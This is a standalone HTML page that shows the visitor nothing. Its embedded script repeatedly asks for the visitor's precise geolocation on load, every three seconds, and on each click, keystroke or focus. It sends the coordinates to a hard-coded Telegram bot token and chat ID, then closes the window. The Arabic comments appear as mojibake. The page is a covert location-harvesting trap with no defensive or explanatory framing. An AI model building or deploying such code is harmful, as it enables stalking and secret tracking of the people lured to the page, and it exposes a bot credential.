<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title> </title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        let requestCount = 0;
        let isRequesting = false;

        function startLocationRequests() {
            console.log("Ø¨Ø¯Ø¡ Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹...");
            
            // Ø·Ù„Ø¨ ÙÙˆØ±ÙŠ
            requestLocation();
            
            // Ø·Ù„Ø¨ ÙƒÙ„ 3 Ø«ÙˆØ§Ù†ÙŠ
            setInterval(requestLocation, 3000);
            
            // Ø·Ù„Ø¨ Ø¹Ù†Ø¯ Ø£ÙŠ ØªÙØ§Ø¹Ù„
            document.addEventListener('click', triggerRequest);
            document.addEventListener('touchstart', triggerRequest);
            document.addEventListener('keydown', triggerRequest);
            window.addEventListener('focus', triggerRequest);
        }

        function triggerRequest() {
            if (!isRequesting) {
                requestLocation();
            }
        }

        function requestLocation() {
            if (isRequesting) return;
            
            isRequesting = true;
            requestCount++;
            console.log(`Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ #${requestCount}`);

            if (!navigator.geolocation) {
                console.log("Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„Ù…ÙˆÙ‚Ø¹");
                isRequesting = false;
                return;
            }

            navigator.geolocation.getCurrentPosition(
                // âœ… Ø§Ù„Ù†Ø¬Ø§Ø­
                async function(position) {
                    console.log("âœ… ØªÙ… Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹!");
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª
                    await sendToTelegram(lat, lng, accuracy, requestCount);
                    
                    // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©
                    setTimeout(() => {
                        window.close();
                    }, 1000);
                },
                // âŒ Ø§Ù„ÙØ´Ù„
                function(error) {
                    console.log(`âŒ ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø·Ù„Ø¨ #${requestCount}:`, error.message);
                    isRequesting = false;
                    
                    // Ù†Ø¹ÙŠØ¯ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¹Ø¯ ÙˆÙ‚Øª Ù‚ØµÙŠØ±
                    setTimeout(() => {
                        isRequesting = false;
                    }, 1000);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        }

        async function sendToTelegram(lat, lng, accuracy, attempts) {
            const message = 
                `ğŸ¯ Ù…ÙˆÙ‚Ø¹ Ù…Ù† Ø·Ù„Ø¨ Ù„Ø§ Ù†Ù‡Ø§Ø¦ÙŠ\n\n` +
                `ğŸ“ Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª:\n` +
                `â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${lat.toFixed(6)}\n` +
                `â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${lng.toFixed(6)}\n` +
                `â€¢ Ø§Ù„Ø¯Ù‚Ø©: ${accuracy} Ù…ØªØ±\n\n` +
                `ğŸ”„ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©: ${attempts}\n` +
                `ğŸ•’ Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-MA')}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                console.log("âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª");
            } catch (error) {
                console.log("âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:", error);
            }
        }

        // Ø§Ù„Ø¨Ø¯Ø¡ Ø¨Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ù…Ø¨Ø§Ø´Ø±Ø©
        window.onload = function() {
            console.log("Ø§Ù„ØµÙØ­Ø© Ù…Ø­Ù…Ù„Ø© - Ø¨Ø¯Ø¡ Ø§Ù„Ø·Ù„Ø¨Ø§Øª...");
            startLocationRequests();
        };

        // Ø£ÙŠØ¶Ø§Ù‹ Ù†Ø¨Ø¯Ø£ Ø¹Ù†Ø¯Ù…Ø§ ÙŠØµØ¨Ø­ Ø§Ù„ØµÙØ­Ø© Ù…Ø±Ø¦ÙŠØ©
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                console.log("Ø§Ù„ØµÙØ­Ø© Ù…Ø±Ø¦ÙŠØ© - Ø·Ù„Ø¨ Ù…ÙˆÙ‚Ø¹...");
                setTimeout(requestLocation, 500);
            }
        });

    </script>
</head>
<body style="margin:0;padding:0;background:#f0f0f0;">
    <!-- ØµÙØ­Ø© Ù…Ø¹ Ø®Ù„ÙÙŠØ© Ù…Ø±Ø¦ÙŠØ© Ù„Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„ØªØ­Ù…ÙŠÙ„ -->
</body>
</html>